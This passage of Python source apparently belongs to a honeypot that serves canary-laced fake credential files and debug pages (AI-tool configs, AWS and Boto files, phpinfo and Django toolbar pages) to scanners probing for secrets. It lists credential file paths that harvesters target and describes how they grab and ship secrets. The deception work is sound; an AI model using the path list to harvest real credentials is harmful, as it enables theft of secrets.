    # Continue.dev's `~/.continue/config.json`. Models list with provider
    # + apiKey per entry.
    aws = _aws(r)
    return json.dumps({
        "models": [
            {
                "title": "Claude 3.5 Sonnet",
                "provider": "anthropic",
                "model": "claude-3-5-sonnet-20241022",
                "apiKey": aws.get("awsSecretAccessKey", ""),
            },
            {
                "title": "GPT-4o",
                "provider": "openai",
                "model": "gpt-4o",
                "apiKey": aws.get("awsAccessKeyId", ""),
            },
        ],
        "tabAutocompleteModel": {
            "title": "Codestral",
            "provider": "mistral",
            "model": "codestral-latest",
            "apiKey": aws.get("awsSessionToken", ""),
        },
    }, indent=2).encode("utf-8")


def render_cody_config_json(r: dict[str, object]) -> bytes:
    # Sourcegraph Cody config. Access token + endpoint URL.
    aws = _aws(r)
    return json.dumps({
        "endpoint": "https://sourcegraph.com",
        "accessToken": aws.get("awsSecretAccessKey", ""),
        "customHeaders": {},
        "autocomplete": {"enabled": True},
    }, indent=2).encode("utf-8")


def render_aider_conf_yml(r: dict[str, object]) -> bytes:
    # Aider's `~/.aider.conf.yml` — YAML with provider API keys.
    aws = _aws(r)
    return (
        f"openai-api-key: {aws.get('awsAccessKeyId', '')}\n"
        f"anthropic-api-key: {aws.get('awsSecretAccessKey', '')}\n"
        "model: claude-3-5-sonnet-20241022\n"
        "auto-commits: false\n"
        "dirty-commits: true\n"
        "git: true\n"
    ).encode("utf-8")


def render_open_interpreter_yaml(r: dict[str, object]) -> bytes:
    # Open Interpreter `~/.config/open-interpreter/config.yaml`.
    aws = _aws(r)
    return (
        "llm:\n"
        "  provider: anthropic\n"
        "  model: claude-3-5-sonnet-20241022\n"
        f"  api_key: {aws.get('awsSecretAccessKey', '')}\n"
        "  context_window: 200000\n"
        "  max_tokens: 4096\n"
        "auto_run: false\n"
        "offline: false\n"
    ).encode("utf-8")


def render_litellm_config_yaml(r: dict[str, object]) -> bytes:
    # LiteLLM proxy `config.yaml` — model_list with per-model api_key.
    aws = _aws(r)
    return (
        "model_list:\n"
        "  - model_name: claude-3-5-sonnet\n"
        "    litellm_params:\n"
        "      model: anthropic/claude-3-5-sonnet-20241022\n"
        f"      api_key: {aws.get('awsSecretAccessKey', '')}\n"
        "  - model_name: gpt-4o\n"
        "    litellm_params:\n"
        "      model: openai/gpt-4o\n"
        f"      api_key: {aws.get('awsAccessKeyId', '')}\n"
        "general_settings:\n"
        f"  master_key: {aws.get('awsSessionToken', '')}\n"
        "  database_url: postgres://litellm:" + _fake_db_password() + "@db.internal:5432/litellm\n"
    ).encode("utf-8")


def render_langsmith_env(r: dict[str, object]) -> bytes:
    # LangSmith `.env`-style — env-var key=value lines.
    aws = _aws(r)
    return (
        f"LANGSMITH_API_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"LANGCHAIN_API_KEY={aws.get('awsSecretAccessKey', '')}\n"
        "LANGSMITH_TRACING=true\n"
        "LANGSMITH_PROJECT=internal-tools\n"
        "LANGSMITH_ENDPOINT=https://api.smith.langchain.com\n"
    ).encode("utf-8")


def render_huggingface_token(r: dict[str, object]) -> bytes:
    # HuggingFace CLI stores its auth token at `~/.huggingface/token`
    # (or under `~/.cache/huggingface/`) as plain text — single line, no
    # newline. Real HF tokens start with `hf_`; we ship the AWS access key
    # raw because (a) a key-format-filtering harvester will drop either
    # way, and (b) a `cat`-and-exfil scanner just wants any string.
    aws = _aws(r)
    return aws.get("awsAccessKeyId", "").encode("utf-8")


def render_streamlit_secrets_toml(r: dict[str, object]) -> bytes:
    # Streamlit's `~/.streamlit/secrets.toml` — TOML, often used as a
    # generic secrets file by self-hosted Streamlit apps.
    aws = _aws(r)
    return (
        f'OPENAI_API_KEY = "{aws.get("awsAccessKeyId", "")}"\n'
        f'ANTHROPIC_API_KEY = "{aws.get("awsSecretAccessKey", "")}"\n'
        f'HUGGINGFACE_TOKEN = "{aws.get("awsSessionToken", "")}"\n'
        "\n"
        "[database]\n"
        'host = "db.internal"\n'
        'port = 5432\n'
        'database = "appdb"\n'
        'user = "app_prod"\n'
        f'password = "{_fake_db_password()}"\n'
    ).encode("utf-8")


def render_generic_ai_api_config_json(r: dict[str, object]) -> bytes:
    # Generic provider config JSON (Cohere, Tabnine, Bito, Codeium,
    # Roost, Pinecone-shaped, etc.). Field names match what the various
    # docs use most commonly: `api_key`, `apiKey`, `model`, `base_url`.
    aws = _aws(r)
    return json.dumps({
        "api_key": aws.get("awsSecretAccessKey", ""),
        "apiKey": aws.get("awsAccessKeyId", ""),
        "session_token": aws.get("awsSessionToken", ""),
        "base_url": "https://api.example.com",
        "model": "claude-3-5-sonnet-20241022",
        "environment": "production",
    }, indent=2).encode("utf-8")


def render_baseten_yaml(r: dict[str, object]) -> bytes:
    # Baseten config (deployed-model platform) — YAML with api_key.
    aws = _aws(r)
    return (
        "model_name: internal-summariser\n"
        f"api_key: {aws.get('awsSecretAccessKey', '')}\n"
        "environment: production\n"
        "remote_url: https://app.baseten.co\n"
    ).encode("utf-8")


# --- AI-IDE credential dictionary expansion (May 2026) -------------------
#
# Scanner dictionaries spotted in mid-May 2026 broadened further to cover
# current-generation AI-IDE CLIs (OpenAI Codex, Google Gemini CLI), per-
# vendor LLM API-key files (DashScope, DeepSeek, Moonshot/Kimi), and a
# long tail of niche coding-assistant configs (OpenClaw, OpenCode,
# vast.ai, Nerve, Spawn, MoltBook). Two-IP coordinated 116-path sweeps
# observed; renderers below ship the same AWS Tracebit canary dressed in
# each tool's documented config shape — same caveat as the earlier
# expansion: a key-format-filtering harvester drops the value as
# obviously-fake, a field-name harvester (`api_key`, `OPENAI_API_KEY`,
# `access_token`) still serializes and ships, tripping the AWS canary on
# replay. The probe is the primary intel either way.


def render_codex_auth_json(r: dict[str, object]) -> bytes:
    # OpenAI Codex CLI `~/.codex/auth.json`. The real file holds an
    # OPENAI_API_KEY plus the OAuth id/access/refresh-token triple from
    # the device-code flow Codex CLI uses for ChatGPT-account sign-in.
    aws = _aws(r)
    return json.dumps({
        "OPENAI_API_KEY": aws.get("awsAccessKeyId", ""),
        "tokens": {
            "id_token": aws.get("awsSessionToken", ""),
            "access_token": aws.get("awsAccessKeyId", ""),
            "refresh_token": aws.get("awsSecretAccessKey", ""),
            "account_id": "user-canary",
        },
        "last_refresh": "2026-01-01T00:00:00.000Z",
    }, indent=2).encode("utf-8")


def render_gemini_oauth_creds_json(r: dict[str, object]) -> bytes:
    # Google Gemini CLI `~/.gemini/oauth_creds.json`. Stores Google OAuth
    # refresh + access tokens after `gemini auth`. Standard
    # google-auth-library JSON shape.
    aws = _aws(r)
    return json.dumps({
        "access_token": aws.get("awsAccessKeyId", ""),
        "refresh_token": aws.get("awsSecretAccessKey", ""),
        "scope": "https://www.googleapis.com/auth/cloud-platform openid",
        "token_type": "Bearer",
        "id_token": aws.get("awsSessionToken", ""),
        "expiry_date": 4102444800000,
    }, indent=2).encode("utf-8")


def render_gemini_settings_json(r: dict[str, object]) -> bytes:
    # Google Gemini CLI `~/.gemini/settings.json` — model + provider
    # config; some workflows put the API key here directly.
    aws = _aws(r)
    return json.dumps({
        "model": "gemini-2.0-flash-exp",
        "apiKey": aws.get("awsSecretAccessKey", ""),
        "GOOGLE_API_KEY": aws.get("awsAccessKeyId", ""),
        "selectedAuthType": "oauth-personal",
        "theme": "Default",
    }, indent=2).encode("utf-8")


def render_ai_rules_text(r: dict[str, object]) -> bytes:
    # `.cursorrules` / `.windsurfrules` / `.clinerules` — plain-text
    # instruction files attached to the IDE workspace. The interesting
    # thing for a scanner is that operators routinely paste API keys and
    # internal URLs into these to "let the agent reach our staging".
    # Per-hit canary URL embeds a uuid we can correlate to the probe.
    aws = _aws(r)
    callback_id = uuid.uuid4().hex
    return (
        "# Project agent rules\n"
        "\n"
        "Always run pytest before suggesting code changes.\n"
        "Internal services (staging) are reachable via the canary endpoints below.\n"
        "Use these credentials for local development only.\n"
        "\n"
        f"INTERNAL_API_BASE=https://staging.internal.lan/agent/{callback_id}/\n"
        f"INTERNAL_API_TOKEN={aws.get('awsSecretAccessKey', '')}\n"
        f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        "\n"
        "Prefer the staging Postgres over the production one.\n"
    ).encode("utf-8")


def render_cursor_state_vscdb(r: dict[str, object]) -> bytes:
    # Cursor IDE persists workspace state — including the OAuth session
    # blob, recent API keys, and per-tab context — at
    # `~/.cursor/User/globalStorage/state.vscdb`. The file is a real
    # SQLite database (vscode keeps a `cursor-data.ItemTable` k/v table).
    # A `cat`-and-exfil scanner ships the raw bytes; a sqlite-aware
    # scanner opens it and grep'es the table — both paths walk away
    # with the canary tokens. We use `sqlite3.Connection.serialize()`
    # (Python 3.11+) to produce a byte-identical-shape db without I/O.
    import sqlite3
    aws = _aws(r)
    conn = sqlite3.connect(":memory:")
    try:
        c = conn.cursor()
        c.execute("CREATE TABLE ItemTable (key TEXT UNIQUE ON CONFLICT REPLACE, value BLOB)")
        rows = [
            ("cursor.composer.apiKey", aws.get("awsAccessKeyId", "")),
            ("cursor.session.accessToken", aws.get("awsSecretAccessKey", "")),
            ("cursor.session.refreshToken", aws.get("awsSessionToken", "")),
            ("anthropic.apiKey", aws.get("awsSecretAccessKey", "")),
            ("openai.apiKey", aws.get("awsAccessKeyId", "")),
        ]
        c.executemany("INSERT INTO ItemTable(key, value) VALUES (?, ?)", rows)
        conn.commit()
        return bytes(conn.serialize())
    finally:
        conn.close()


def render_plain_canary_api_key(r: dict[str, object]) -> bytes:
    # Plain-text-only files like `/.anthropic/api_key` and
    # `/.dashscope/api_key` — single line, no newline, just the key.
    # Most "is there a key here?" scanners just cat-and-exfil; the
    # canary value is the whole file.
    aws = _aws(r)
    return aws.get("awsAccessKeyId", "").encode("utf-8")


def render_deepseek_config_json(r: dict[str, object]) -> bytes:
    # DeepSeek CLI / SDK config — provider key + base URL.
    aws = _aws(r)
    return json.dumps({
        "api_key": aws.get("awsSecretAccessKey", ""),
        "DEEPSEEK_API_KEY": aws.get("awsAccessKeyId", ""),
        "base_url": "https://api.deepseek.com",
        "model": "deepseek-coder",
    }, indent=2).encode("utf-8")


def render_kimi_credentials_json(r: dict[str, object]) -> bytes:
    # Moonshot / Kimi / `kimi-code` credentials file — provider key +
    # optional OAuth refresh token for the kimi-code CLI.
    aws = _aws(r)
    return json.dumps({
        "api_key": aws.get("awsSecretAccessKey", ""),
        "MOONSHOT_API_KEY": aws.get("awsAccessKeyId", ""),
        "refresh_token": aws.get("awsSessionToken", ""),
        "base_url": "https://api.moonshot.cn/v1",
        "model": "moonshot-v1-32k",
    }, indent=2).encode("utf-8")


def render_openclaw_json(r: dict[str, object]) -> bytes:
    # OpenClaw config — provider api_key + workspace env.
    aws = _aws(r)
    return json.dumps({
        "apiKey": aws.get("awsSecretAccessKey", ""),
        "OPENAI_API_KEY": aws.get("awsAccessKeyId", ""),
        "ANTHROPIC_API_KEY": aws.get("awsSecretAccessKey", ""),
        "provider": "anthropic",
        "model": "claude-3-5-sonnet-20241022",
        "workspace": "/srv/app",
    }, indent=2).encode("utf-8")


def render_opencode_config_json(r: dict[str, object]) -> bytes:
    # OpenCode CLI `~/.config/opencode/config.json` — provider keys.
    aws = _aws(r)
    return json.dumps({
        "provider": {
            "anthropic": {"api_key": aws.get("awsSecretAccessKey", "")},
            "openai": {"api_key": aws.get("awsAccessKeyId", "")},
        },
        "model": "anthropic/claude-3-5-sonnet-20241022",
        "autoshare": False,
    }, indent=2).encode("utf-8")


def render_vastai_credentials_json(r: dict[str, object]) -> bytes:
    # vast.ai CLI — GPU rental. Stores an API key with billing access.
    aws = _aws(r)
    return json.dumps({
        "api_key": aws.get("awsAccessKeyId", ""),
        "api_secret": aws.get("awsSecretAccessKey", ""),
        "user_id": 421337,
        "base_url": "https://console.vast.ai/api/v0",
    }, indent=2).encode("utf-8")


def render_nerve_config_yaml(r: dict[str, object]) -> bytes:
    # Nerve agent runtime `~/.nerve/config.yaml` — provider + key.
    aws = _aws(r)
    return (
        "generator: anthropic\n"
        f"anthropic_api_key: {aws.get('awsSecretAccessKey', '')}\n"
        f"openai_api_key: {aws.get('awsAccessKeyId', '')}\n"
        "model: claude-3-5-sonnet-20241022\n"
        "max_steps: 50\n"
        "log_level: info\n"
    ).encode("utf-8")


def render_spawnrc(r: dict[str, object]) -> bytes:
    # Spawn CLI `.spawnrc` — env-var-style.
    aws = _aws(r)
    return (
        f"SPAWN_API_KEY={aws.get('awsSecretAccessKey', '')}\n"
        f"OPENAI_API_KEY={aws.get('awsAccessKeyId', '')}\n"
        f"ANTHROPIC_API_KEY={aws.get('awsSecretAccessKey', '')}\n"
        "SPAWN_MODEL=claude-3-5-sonnet-20241022\n"
        "SPAWN_AUTO_RUN=false\n"
    ).encode("utf-8")


def render_moltbook_credentials_json(r: dict[str, object]) -> bytes:
    # MoltBook agent credentials.
    aws = _aws(r)
    return json.dumps({
        "api_key": aws.get("awsSecretAccessKey", ""),
        "access_token": aws.get("awsAccessKeyId", ""),
        "refresh_token": aws.get("awsSessionToken", ""),
        "model": "claude-3-5-sonnet-20241022",
    }, indent=2).encode("utf-8")


def render_claude_config_json(r: dict[str, object]) -> bytes:
    # Claude Code top-level `~/.claude.json` / `~/.claude/config.json` /
    # `~/.claude/settings.local.json`. Real fields include `numStartups`,
    # `installMethod`, plus a `customApiKeyResponses` block where some
    # users persist non-OAuth provider keys.
    aws = _aws(r)
    return json.dumps({
        "numStartups": 42,
        "installMethod": "npm",
        "autoUpdates": True,
        "theme": "dark",
        "customApiKeyResponses": {
            "apiKeyHelper": "/usr/local/bin/anthropic-api-key-helper",
        },
        "primaryApiKey": aws.get("awsSecretAccessKey", ""),
        "anthropicApiKey": aws.get("awsAccessKeyId", ""),
        "env": {
            "ANTHROPIC_API_KEY": aws.get("awsSecretAccessKey", ""),
            "AWS_ACCESS_KEY_ID": aws.get("awsAccessKeyId", ""),
            "AWS_SECRET_ACCESS_KEY": aws.get("awsSecretAccessKey", ""),
        },
    }, indent=2).encode("utf-8")


def render_claude_history_jsonl(r: dict[str, object]) -> bytes:
    # Claude Code `~/.claude/history.jsonl` — one JSON object per line,
    # most recent user messages. A scanner that opens this hoping for
    # "leaked prompt context" is looking for keys + URLs embedded in
    # prior shell sessions; we ship two plausible-looking lines with
    # the canary inline.
    aws = _aws(r)
    callback_id = uuid.uuid4().hex
    return (
        json.dumps({
            "ts": "2026-01-15T09:42:00Z",
            "type": "user",
            "message": "deploy the staging worker — env vars are AWS_ACCESS_KEY_ID="
            + aws.get("awsAccessKeyId", "")
            + " AWS_SECRET_ACCESS_KEY=" + aws.get("awsSecretAccessKey", ""),
        }) + "\n"
        + json.dumps({
            "ts": "2026-01-15T09:45:11Z",
            "type": "user",
            "message": "the internal API is at https://staging.internal.lan/agent/"
            + callback_id + "/ — token "
            + aws.get("awsSessionToken", ""),
        }) + "\n"
    ).encode("utf-8")


def render_agents_md(r: dict[str, object]) -> bytes:
    # `AGENTS.md` / `.claude/CLAUDE.md` — agent instruction file. Real
    # repos commit these; the operator-side gotcha is people pasting
    # internal URLs and provider keys into them.
    aws = _aws(r)
    callback_id = uuid.uuid4().hex
    return (
        "# Agent instructions\n"
        "\n"
        "This repository is wired up for an internal coding agent.\n"
        "\n"
        "## Credentials\n"
        "\n"
        f"- `ANTHROPIC_API_KEY={aws.get('awsSecretAccessKey', '')}` (staging)\n"
        f"- `OPENAI_API_KEY={aws.get('awsAccessKeyId', '')}` (staging)\n"
        f"- Internal API: <https://staging.internal.lan/agent/{callback_id}/>\n"
        "\n"
        "## Running\n"
        "\n"
        "```bash\n"
        "pytest -q\n"
        "make deploy-staging\n"
        "```\n"
    ).encode("utf-8")


def render_boto_config(r: dict[str, object]) -> bytes:
    """`~/.boto` — INI-style config for the AWS Python SDK
    (`boto`/`boto3`/`gsutil`). The `[Credentials]` section carries
    `aws_access_key_id` and `aws_secret_access_key`; some projects also
    keep per-profile sections (`[profile prod]`). Embed the canary AWS
    keys in both shapes so a field-keyed harvester picks them up either
    way."""
    aws = _aws(r)
    return (
        "[Credentials]\n"
        f"aws_access_key_id = {aws.get('awsAccessKeyId', '')}\n"
        f"aws_secret_access_key = {aws.get('awsSecretAccessKey', '')}\n"
        f"aws_session_token = {aws.get('awsSessionToken', '')}\n"
        "\n"
        "[Boto]\n"
        "http_socket_timeout = 60\n"
        "metadata_service_timeout = 5\n"
        "metadata_service_num_attempts = 3\n"
        "\n"
        "[s3]\n"
        "host = s3.amazonaws.com\n"
        "\n"
        "[profile prod]\n"
        f"aws_access_key_id = {aws.get('awsAccessKeyId', '')}\n"
        f"aws_secret_access_key = {aws.get('awsSecretAccessKey', '')}\n"
        "region = us-east-1\n"
    ).encode("utf-8")


def render_symfony_profiler_phpinfo(r: dict[str, object]) -> bytes:
    """Symfony Web Profiler phpinfo() page served by dev-mode scanners
    hitting `/_profiler/phpinfo`, `/app_dev.php/_profiler/phpinfo`, and
    siblings. Closer in shape to vanilla phpinfo than the Symfony toolbar
    chrome — that's what credential-harvester scanners actually grep —
    but with the Symfony env-var triple (`APP_SECRET`, `DATABASE_URL`,
    `MAILER_DSN`) added on top of the standard AWS / DB block since
    those are the variables a profiler-leak would expose first."""
    aws = _aws(r)
    ak = aws.get("awsAccessKeyId", "")
    sk = aws.get("awsSecretAccessKey", "")
    st = aws.get("awsSessionToken", "")
    db_password = _fake_db_password()
    app_secret = secrets.token_hex(16)
    mailer_password = _fake_db_password()
    return (
        "<!DOCTYPE html>\n"
        "<html><head><title>phpinfo()</title>\n"
        "<style>body{background:#fff;color:#000;font-family:sans-serif}"
        "table{border-collapse:collapse;width:80%;margin:1em auto}"
        "th,td{border:1px solid #000;padding:4px 8px}"
        "h1{background:#9999cc;text-align:center}"
        "h2{background:#ccccff;margin-top:2em}</style></head><body>\n"
        "<h1>PHP Version 8.2.15</h1>\n"
        "<h2>Symfony</h2>\n"
        "<table>\n"
        "<tr><th>Symfony version</th><td>6.4.7</td></tr>\n"
        "<tr><th>Environment</th><td>dev</td></tr>\n"
        "<tr><th>Debug</th><td>true</td></tr>\n"
        "<tr><th>Token</th><td>" + secrets.token_hex(4) + "</td></tr>\n"
        "</table>\n"
        "<h2>Environment</h2>\n"
        "<table>\n"
        "<tr><th>Variable</th><th>Value</th></tr>\n"
        f"<tr><td>APP_ENV</td><td>dev</td></tr>\n"
        f"<tr><td>APP_DEBUG</td><td>1</td></tr>\n"
        f"<tr><td>APP_SECRET</td><td>{app_secret}</td></tr>\n"
        f"<tr><td>DATABASE_URL</td><td>mysql://prod_rw:{db_password}@db.internal:3306/prod?serverVersion=8.0</td></tr>\n"
        f"<tr><td>MAILER_DSN</td><td>smtp://apikey:{mailer_password}@smtp.sendgrid.net:587</td></tr>\n"
        f"<tr><td>AWS_ACCESS_KEY_ID</td><td>{ak}</td></tr>\n"
        f"<tr><td>AWS_SECRET_ACCESS_KEY</td><td>{sk}</td></tr>\n"
        f"<tr><td>AWS_SESSION_TOKEN</td><td>{st}</td></tr>\n"
        "<tr><td>AWS_DEFAULT_REGION</td><td>us-east-1</td></tr>\n"
        "<tr><td>S3_BUCKET</td><td>prod-uploads</td></tr>\n"
        "</table>\n"
        "<h2>Loaded Modules</h2>\n"
        "<p>core, date, libxml, openssl, pcre, sqlite3, zlib, ctype, curl, "
        "dom, fileinfo, filter, hash, iconv, json, mbstring, SPL, session, "
        "pdo_mysql, mysqlnd, intl, opcache, redis</p>\n"
        "</body></html>\n"
    ).encode("utf-8")


def render_symfony_parameters_yml(r: dict[str, object]) -> bytes:
    """Symfony legacy `app/config/parameters.yml` shape — DB / mailer /
    AWS creds in YAML form. Also returned as the body of
    `/_profiler/open` since that dev-mode endpoint reads arbitrary files
    when `file=app/config/parameters.yml` (or any similar) is supplied,
    and the YAML body grep-matches the same harvester patterns
    regardless of which `file=` value the scanner asked for."""
    aws = _aws(r)
    db_password = _fake_db_password()
    mailer_password = _fake_db_password()
    app_secret = secrets.token_hex(16)
    return (
        "# This file is auto-generated during the composer install\n"
        "parameters:\n"
        "    database_driver: pdo_mysql\n"
        "    database_host: db.internal\n"
        "    database_port: 3306\n"
        "    database_name: prod\n"
        "    database_user: prod_rw\n"
        f"    database_password: '{db_password}'\n"
        "    mailer_transport: smtp\n"
        "    mailer_host: smtp.sendgrid.net\n"
        "    mailer_port: 587\n"
        "    mailer_user: apikey\n"
        f"    mailer_password: '{mailer_password}'\n"
        f"    secret: '{app_secret}'\n"
        "    locale: en\n"
        f"    aws_access_key_id: '{aws.get('awsAccessKeyId', '')}'\n"
        f"    aws_secret_access_key: '{aws.get('awsSecretAccessKey', '')}'\n"
        f"    aws_session_token: '{aws.get('awsSessionToken', '')}'\n"
        "    aws_default_region: us-east-1\n"
        "    aws_s3_bucket: prod-uploads\n"
    ).encode("utf-8")


def render_yii2_debug_view(r: dict[str, object]) -> bytes:
    """Yii2 debugger ConfigPanel view — HTML page mimicking the
    `?panel=config` rendering that the dev-mode `yii\\debug\\Module`
    serves. Embeds the AWS canary in the `$_ENV` table and the per-hit
    DB / mailer passwords in the `components.*` config rows so a
    harvester grepping for `AWS_ACCESS_KEY_ID` / `db.password` finds
    both. Same body is returned for `?panel=db`, `?panel=request`,
    etc. — credential-grepping scanners don't differentiate."""
    aws = _aws(r)
    ak = aws.get("awsAccessKeyId", "")
    sk = aws.get("awsSecretAccessKey", "")
    st = aws.get("awsSessionToken", "")
    db_password = _fake_db_password()
    mailer_password = _fake_db_password()
    tag = secrets.token_hex(4)
    return (
        "<!DOCTYPE html><html><head><title>Yii Debugger / Configuration</title>"
        "<style>body{font-family:sans-serif;margin:0;padding:0;background:#fff;color:#000}"
        ".yii-debug-toolbar{background:#1a1a1a;color:#eee;padding:6px 12px;font-size:12px}"
        ".panel{padding:1em 2em}"
        "h2{border-bottom:1px solid #ccc;padding:.4em 0;margin-top:1.5em}"
        "table{border-collapse:collapse;width:100%}"
        "th,td{padding:4px 8px;border:1px solid #ddd;text-align:left;font-family:monospace;font-size:12px}"
        "th{background:#f5f5f5}"
        "</style></head>"
        f"<body><div class=\"yii-debug-toolbar\">Yii Debugger &mdash; tag {tag}</div>"
        "<div class=\"panel\">"
        "<h2>Application Configuration</h2>"
        "<table>"
        "<tr><th>Yii Version</th><td>2.0.49</td></tr>"
        "<tr><th>Application Name</th><td>My Application</td></tr>"
        "<tr><th>Environment</th><td>dev</td></tr>"
        "<tr><th>Debug</th><td>YES</td></tr>"
        "<tr><th>PHP Version</th><td>8.2.15</td></tr>"
        "</table>"
        "<h2>$_ENV</h2>"
        "<table>"
        f"<tr><th>AWS_ACCESS_KEY_ID</th><td>{ak}</td></tr>"
        f"<tr><th>AWS_SECRET_ACCESS_KEY</th><td>{sk}</td></tr>"
        f"<tr><th>AWS_SESSION_TOKEN</th><td>{st}</td></tr>"
        "<tr><th>AWS_DEFAULT_REGION</th><td>us-east-1</td></tr>"
        "<tr><th>S3_BUCKET</th><td>prod-uploads</td></tr>"
        "</table>"
        "<h2>components</h2>"
        "<table>"
        "<tr><th>db.class</th><td>yii\\db\\Connection</td></tr>"
        "<tr><th>db.dsn</th><td>mysql:host=db.internal;dbname=prod;charset=utf8mb4</td></tr>"
        "<tr><th>db.username</th><td>prod_rw</td></tr>"
        f"<tr><th>db.password</th><td>{db_password}</td></tr>"
        "<tr><th>mailer.class</th><td>yii\\swiftmailer\\Mailer</td></tr>"
        "<tr><th>mailer.transport.class</th><td>Swift_SmtpTransport</td></tr>"
        "<tr><th>mailer.transport.host</th><td>smtp.sendgrid.net</td></tr>"
        "<tr><th>mailer.transport.port</th><td>587</td></tr>"
        "<tr><th>mailer.transport.username</th><td>apikey</td></tr>"
        f"<tr><th>mailer.transport.password</th><td>{mailer_password}</td></tr>"
        "</table>"
        "</div></body></html>"
    ).encode("utf-8")


def render_django_debug_toolbar(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    ak = aws.get("awsAccessKeyId", "")
    sk = aws.get("awsSecretAccessKey", "")
    st = aws.get("awsSessionToken", "")
    db_password = _fake_db_password()
    secret_key = secrets.token_hex(25)
    return (
        "<!DOCTYPE html><html><head><title>Django Debug Toolbar - Settings</title>"
        "<style>body{font-family:sans-serif;margin:0;padding:0;background:#fff;color:#333}"
        "#djdt{background:#1c1c1c;color:#eee;padding:6px 12px;font-size:12px}"
        ".djdt-panel{padding:1em 2em}"
        "h3{border-bottom:1px solid #ccc;padding:.4em 0;margin-top:1.5em}"
        "table{border-collapse:collapse;width:100%}"
        "th,td{padding:4px 8px;border:1px solid #ddd;text-align:left;font-family:monospace;font-size:12px}"
        "th{background:#f0f0f0;font-weight:bold}"
        "</style></head>"
        "<body><div id=\"djdt\">Django Debug Toolbar</div>"
        "<div class=\"djdt-panel\">"
        "<h3>Settings</h3>"
        "<table>"
        "<tr><th>Setting</th><th>Value</th></tr>"
        "<tr><td>DEBUG</td><td>True</td></tr>"
        f"<tr><td>SECRET_KEY</td><td>'{secret_key}'</td></tr>"
        f"<tr><td>DATABASE_URL</td><td>postgres://prod_rw:{db_password}@db.internal:5432/prod</td></tr>"
        "<tr><td>ALLOWED_HOSTS</td><td>['*']</td></tr>"
        "<tr><td>INSTALLED_APPS</td><td>['django.contrib.admin', 'django.contrib.auth', "
        "'django.contrib.contenttypes', 'django.contrib.sessions', "
        "'debug_toolbar', 'rest_framework', 'app']</td></tr>"
        "</table>"
        "<h3>Environment Variables</h3>"
        "<table>"
        "<tr><th>Variable</th><th>Value</th></tr>"
        f"<tr><td>AWS_ACCESS_KEY_ID</td><td>{ak}</td></tr>"
        f"<tr><td>AWS_SECRET_ACCESS_KEY</td><td>{sk}</td></tr>"
        f"<tr><td>AWS_SESSION_TOKEN</td><td>{st}</td></tr>"
        "<tr><td>AWS_DEFAULT_REGION</td><td>us-east-1</td></tr>"
        "<tr><td>S3_BUCKET</td><td>prod-uploads</td></tr>"
        "<tr><td>DJANGO_SETTINGS_MODULE</td><td>config.settings</td></tr>"
        "</table>"
        "</div></body></html>\n"
    ).encode("utf-8")


def render_amplifyrc_json(r: dict[str, object]) -> bytes:
    """`.amplifyrc` is an AWS Amplify CLI project config that some teams
    accidentally commit. Real shape varies by Amplify version, but the
    field that matters is the `providers.awscloudformation` block —
    when `useProfile` is false, the long-form key + secret end up here
    directly. Field-name-keyed harvesters look for `accessKeyId` /
    `secretAccessKey`, which is where we put the canary."""
    aws = _aws(r)
    body = {
        "projectName": "internal-app",
        "appId": "d2example1234",
        "envName": "prod",
        "defaultEditor": "code",
        "frontend": {
            "framework": "react",
            "config": {
                "SourceDir": "src",
                "DistributionDir": "build",
            },
        },
        "providers": {
            "awscloudformation": {
                "configLevel": "project",
                "useProfile": False,
                "profileName": "default",
                "accessKeyId": aws.get("awsAccessKeyId", ""),
                "secretAccessKey": aws.get("awsSecretAccessKey", ""),
                "region": "us-east-1",
            },
        },
    }
    return (json.dumps(body, indent=2) + "\n").encode("utf-8")


@dataclass(frozen=True)
class CanaryTrap:
    name: str                      # log tag, e.g. "aws-credentials-file"
    paths: tuple[str, ...]          # exact lowercase matches
    canary_types: tuple[str, ...]   # Tracebit types to request
    render: "Callable[[dict[str, object]], bytes]"
    content_type: str
    # Optional: extra response headers to emit (e.g. Set-Cookie for gitlab-cookie).
    extra_headers: "Callable[[dict[str, object]], tuple[tuple[str, str], ...]]" = field(
        default=lambda _r: ()
    )


def _gitlab_cookie_header(r: dict[str, object]) -> tuple[tuple[str, str], ...]:
    creds = _gitlab_creds(r, "gitlab-cookie").get("credentials")
    if not isinstance(creds, dict):
        return ()
    cookie_name = str(creds.get("name") or creds.get("cookie_name") or "_gitlab_session")
    cookie_value = str(
        creds.get("value") or creds.get("cookie_value") or creds.get("password") or "",
    )
    if not cookie_value:
        return ()
    return (
        ("Set-Cookie", f"{cookie_name}={cookie_value}; Path=/; HttpOnly; SameSite=Lax"),
    )


CANARY_TRAPS: tuple[CanaryTrap, ...] = (
    CanaryTrap(
        "aws-credentials-file",
        ("/.aws/credentials",),
        ("aws",),
        render_aws_credentials_ini,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "aws-config-file",
        ("/.aws/config",),
        ("aws",),
        render_aws_config_ini,
        "text/plain; charset=utf-8",
    ),
    # `~/.boto` — AWS Python SDK / `gsutil` legacy config file. Carries
    # `aws_access_key_id` / `aws_secret_access_key` in plaintext INI;
    # field-keyed scanners hit this alongside `.aws/credentials`.
    # Webroot-prefix variants (`/root/.boto`, `/home/.boto`) mirror the
    # ssh-private-key / docker-config patterns. `/.boto3` is the same
    # file under a Python-3-flavoured filename some teams (incorrectly)
    # adopted; scanner dictionaries enumerate both.
    CanaryTrap(
        "boto-config",
        (
            "/.boto",
            "/.boto3",
            "/root/.boto",
            "/home/.boto",
        ),
        ("aws",),
        render_boto_config,
        "text/plain; charset=utf-8",
    ),
    # AWS Amplify CLI project config. Some Amplify versions stash
    # `accessKeyId` / `secretAccessKey` directly in
    # `providers.awscloudformation` when `useProfile=false`, so a
    # committed `.amplifyrc` is a one-shot AWS credential leak.
    CanaryTrap(
        "amplifyrc",
        ("/.amplifyrc",),
        ("aws",),
        render_amplifyrc_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "terraform-tfstate",
        (
            # `.terraform/terraform.tfstate` is the in-repo path Terraform
            # writes when initialised against a local backend. The bare
            # `/terraform.tfstate` and `.backup` sibling are scanner-dictionary
            # variants — same shape, same canary placement.
            "/.terraform/terraform.tfstate",
            "/terraform.tfstate",
            "/terraform.tfstate.backup",
        ),
        ("aws",),
        render_terraform_tfstate,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "pgpass",
        ("/.pgpass",),
        ("gitlab-username-password",),
        render_pgpass,
